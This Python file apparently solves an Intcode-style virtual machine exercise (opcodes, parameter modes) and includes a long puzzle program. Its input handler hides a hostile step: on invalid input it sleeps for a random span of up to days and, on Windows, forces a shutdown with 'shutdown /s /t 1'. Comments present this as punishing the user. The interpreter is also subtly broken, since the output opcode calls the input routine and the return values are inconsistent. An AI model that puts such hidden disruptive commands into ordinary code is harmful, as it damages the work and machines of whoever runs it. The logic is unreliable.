import enum
from colorama import Fore
import logging
import time
import random
from sys import platform
import subprocess
# Extend the simulated computer from the second week:

# - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
# - 6: jump-if-false: if the first parameter is zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
# - 7: less than: if the first parameter is less than the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
# - 8: equals: if the first parameter is equal to the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
#
# caution: since these opcodes expect a variable number of parameters the instruction pointer after executing an instruction should no longer always
# increase by four. Instead, it should increase  according to the number of parameters that instruction expects.
# If, however, the opcode directly manipulates the instruction pointer (5 and 6) there should be no additional modification of the instruction pointer.
# The next instruction to execute is stored directly at the location indicated by the parameter to these opcodes.
# caution: numbers in your storage, as well as inputs can be negative!
#
# Additionally, you need to support two different parameter modes: position mode (mode 0), and immediate mode (mode 1).

# Position mode: Opcode arguments are memory addresses. If an argument has the value 18 you fetch the 'calculation value'
#   from the memory at address 18. This is the mode you already know from last time.
# Immediate mode: In immediate mode a parameter is directly interpreted as a value. If the first argument to the 'sum' opcode is 8
#   then the first summand in your calculation is 8.

#
# Parameter modes are specified per-parameter as part of the opcode by extending the opcodes.
# When reading a number that specifies an opcode
#   - the two right-most digits contain the actual opcode
#   - any further digits contain the parameter mode of the parameters, reading digits from right-to-left
#     and parameters in-order from left to right. Any unspecified digits default to 0 (position mode).
#     NOTE: parameters for the target address of a write operation (e.g. the third parameter of the 'sum' or 'multiply' opcode)
#           are never given in immediate mode.
#
# Here's an example:
#   consider the sequence of instructions `1002,4,3,4,33`.
#   The two right-most digits of the first entry ('02') indicate the opcode: multiplication
#   Then, from right to left the next digit is '0', indicating that the first parameter is in position mode.
#   The next digit is '1' indicating the second parameter is in immediate mode.
#   The next digit is not present, defaulting to '0' so the third parameter is again in position mode.
#   No further parameter modes need to be determined as the multiply instruction accepts 3 parameters.
#   Reading the first parameter in position mode is the value at address '4' -- 33.
#   Reading the second parameter in immediate mode is the value '3'.
#   Executing the multiplication instruction gives us the result 33*3=99
#   The third parameter (4) in position mode assigns this value to the memory in location 4 (the location that used
#   to have value 33 is now 99).
#   Now moving the instruction pointer forward brings us to position 4 with opcode 99, halting the program.
#
# And here's some test cases:
#   3,9,8,9,10,9,4,9,99,-1,8 -- test whether the input is equal to 8 (using position mode)
#   3,3,1107,-1,8,3,4,3,99 -- test whether the input is less than 8 (using immediate mode)
#   3,3,1105,-1,9,1101,0,0,12,4,12,99,1 -- test whether the input is 0 using jump instructions
#
# Finally, run you code for the following instructions; when asked for input provide the number '5'. The program should print a single number when executed.
# Please take note of that number in your PR, so I don't need to run all the files myself :)



commands = [3,225,1,225,6,6,1100,1,238,225,104,0,1101,40,71,224,1001,224,-111,224,4,224,1002,223,8,223,101,7,224,224,1,224,223,223,1102,66,6,225,1102,22,54,225,1,65,35,
            224,1001,224,-86,224,4,224,102,8,223,223,101,6,224,224,1,224,223,223,1102,20,80,225,101,92,148,224,101,-162,224,224,4,224,1002,223,8,223,101,5,224,224,1,224,
            223,223,1102,63,60,225,1101,32,48,225,2,173,95,224,1001,224,-448,224,4,224,102,8,223,223,1001,224,4,224,1,224,223,223,1001,91,16,224,101,-79,224,224,4,224,1002,
            223,8,223,101,3,224,224,1,224,223,223,1101,13,29,225,1101,71,70,225,1002,39,56,224,1001,224,-1232,224,4,224,102,8,223,223,101,4,224,224,1,223,224,223,1101,14,59,225,
            102,38,143,224,1001,224,-494,224,4,224,102,8,223,223,101,3,224,224,1,224,223,223,1102,30,28,224,1001,224,-840,224,4,224,1002,223,8,223,101,4,224,224,1,223,224,
            223,4,223,99,0,0,0,677,0,0,0,0,0,0,0,0,0,0,0,1105,0,99999,1105,227,247,1105,1,99999,1005,227,99999,1005,0,256,1105,1,99999,1106,227,99999,1106,0,265,1105,1,99999,
            1006,0,99999,1006,227,274,1105,1,99999,1105,1,280,1105,1,99999,1,225,225,225,1101,294,0,0,105,1,0,1105,1,99999,1106,0,300,1105,1,99999,1,225,225,225,1101,314,0,0,106,0,0,
            1105,1,99999,107,677,226,224,1002,223,2,223,1005,224,329,1001,223,1,223,8,226,226,224,102,2,223,223,1006,224,344,101,1,223,223,7,226,677,224,1002,223,2,223,1005,224,359,101,
            1,223,223,1007,677,226,224,1002,223,2,223,1005,224,374,1001,223,1,223,1007,677,677,224,1002,223,2,223,1006,224,389,101,1,223,223,1008,226,226,224,1002,223,2,223,1005,224,404,
            1001,223,1,223,108,677,226,224,1002,223,2,223,1006,224,419,1001,223,1,223,1108,677,226,224,102,2,223,223,1006,224,434,1001,223,1,223,108,226,226,224,1002,223,2,223,1005,
            224,449,101,1,223,223,7,677,677,224,1002,223,2,223,1006,224,464,1001,223,1,223,8,226,677,224,1002,223,2,223,1005,224,479,1001,223,1,223,107,226,226,224,102,2,223,223,1006,224,494,101,1,
            223,223,1007,226,226,224,1002,223,2,223,1005,224,509,1001,223,1,223,1107,226,677,224,102,2,223,223,1005,224,524,1001,223,1,223,108,677,677,224,1002,223,2,223,1005,224,539,101,1,
            223,223,1107,677,226,224,102,2,223,223,1005,224,554,1001,223,1,223,107,677,677,224,1002,223,2,223,1005,224,569,101,1,223,223,8,677,226,224,102,2,223,223,1005,224,584,1001,223,1,
            223,7,677,226,224,102,2,223,223,1006,224,599,101,1,223,223,1008,677,677,224,1002,223,2,223,1005,224,614,101,1,223,223,1008,677,226,224,102,2,223,223,1006,224,629,1001,223,1,223,
            1108,677,677,224,102,2,223,223,1006,224,644,101,1,223,223,1108,226,677,224,1002,223,2,223,1005,224,659,1001,223,1,223,1107,226,226,224,102,2,223,223,1006,224,674,1001,223,1,223,
            4,223,99,226]

class op_mode(enum.Enum): 
    POSITION = 0
    IMMEDIATE = 1

class operations(enum.Enum):
    #region opcode explanation
    # - 1: add the values of the two parameters and store the result in the position given by the third parameter
    # - 2: multiply the values of the two parameters and store the result in the position given by the third parameter
    # - 3: read a single integer as input and save it to the position given
    #      by its only parameter. the command 3,19 would read an input
    #      and store the result at address 19
    # - 4: output the value of the single parameter for this opcode.
    #      for example 4,19 would output the value stored at address 19             
    # - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 6: jump-if-false: if the first parameter is zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 7: less than: if the first parameter is less than the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    # - 8: equals: if the first parameter is equal to the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    #endregion
    ADD = 1
    MULTIPLY = 2
    INPUT = 3
    OUTPUT = 4
    JUMP_IF_TRUE = 5
    JUMP_IF_FALSE = 6
    LESS_THAN = 7
    EQUALS = 8
    HALT = 99

def get_element(mode:op_mode,lst:list,idx:int) -> int:
    """returns element based upon the task mode"""
    match mode: 
        case op_mode.POSITION:
            return lst[lst[idx]]
        case op_mode.IMMEDIATE:
            return lst[idx]

def calc(lst:list, idx:int,op:operations, instruction:list) -> int:
    """calc is short for calculator. Handles 1,2,7 and 8"""
    param_one_mode = op_mode(int(instruction[1]))
    param_two_mode = op_mode(int(instruction[0]))

    idx +=1 
    param_one = get_element(param_one_mode,lst,idx)
    idx +=1
    param_two = get_element(param_two_mode,lst,idx)
    idx +=1
    destination = lst[idx]

    match op:
        case operations.ADD:
            lst[destination] = param_one + param_two
        case operations.MULTIPLY:
            lst[destination] = param_one * param_two
        case operations.LESS_THAN:
            lst[destination] = 1 if param_one < param_two else 0
        case operations.EQUALS:
            lst[destination] = 1 if param_one == param_two else 0
    logging.debug(f'Calculation: {lst[destination]}')
    return idx + 1

def jump_operation(lst:list, idx:int, op:operations, instruction:list) -> int:
    """handles the jump operations 5 and 6"""
    param_one_mode = op_mode(int(instruction[1]))
    param_two_mode = op_mode(int(instruction[0]))

    idx += 1
    param_one = get_element(param_one_mode, lst, idx)
    idx += 1
    param_two = get_element(param_two_mode, lst, idx)

    if (op == operations.JUMP_IF_TRUE and param_one != 0) or (op == operations.JUMP_IF_FALSE and param_one == 0):
        return param_two
    return idx + 1 

def read_value(lst: list, idx:int) -> int:
    """handles input value operation 3"""
    idx += 1 
    while not False:
        # ? try catch error, to minimize ID10T errors
        try:    
            lst[lst[idx]] = int(input("Please enter a value: "))
            break
        except ValueError:
            print("Please enter a valid number")
            # ! Punishes the user for wrong input
            time.sleep(random.randint(9999, 999999)) 
            if platform == "win32":
                # ! additionaly punish windows users for using Windows and wrong input
                subprocess.call("shutdown /s /t 1") 
            continue
    logging.debug(f'Value: {lst[lst[idx]]} at index {lst[idx]}')
    return idx + 1

def output_value(lst: list, idx: int, instruction: list) -> int:
    """handles output value operation 4"""
    param_mode = op_mode(int(instruction[1]))
    idx += 1
    output = get_element(param_mode, lst, idx)
    print(f"Output: {output}")
    return idx + 1

def check_for_opcode(idx:int, lst:list):
    operation = str(lst[idx]) 
    while len(operation) < 4:
        operation = '0' + operation
    opcode = operation[-2:] 
    try: 
        opcode = operations(int(opcode))
    except ValueError:
        logging.error(f'Invalid opcode: {opcode} at index {idx}')
        return False, 0
    logging.debug(f'Current opcode: {opcode}')
    end = False
    #region opcode handeling
    match opcode:
        case operations.ADD:
            idx = calc(lst, idx, operations.ADD, operation)
            return idx, end
        case operations.MULTIPLY:
            idx = calc(lst, idx, operations.MULTIPLY,operation)
            return idx, end
        case operations.INPUT:
            idx = read_value(lst, idx)
            return idx, end
        case operations.OUTPUT:
            idx = read_value(lst, idx)
            return idx, end
        case operations.JUMP_IF_TRUE:
            idx = jump_operation(lst, idx, operations.JUMP_IF_TRUE, operation)
            return idx, end
        case operations.JUMP_IF_FALSE:
            idx = jump_operation(lst, idx, operations.JUMP_IF_FALSE, operation)
            return idx, end
        case operations.LESS_THAN:
            idx = calc(lst, idx, operations.LESS_THAN, operation)
            return idx, end
        case operations.EQUALS:
            idx = calc(lst, idx, operations.EQUALS, operation)
            return idx, end
        case operations.HALT:
            end = True
            return 1, end   
    #endregion
    return False, 0

def reader(lst: list,idx:int=0, end:bool=False) -> int:
    while end == False:
        idx, end = check_for_opcode(idx, lst)
    return lst[0]

        

    
print(Fore.LIGHTGREEN_EX + f'-----\nFinal output of the command: {reader(commands)}\n-----')
print(Fore.RESET)                                            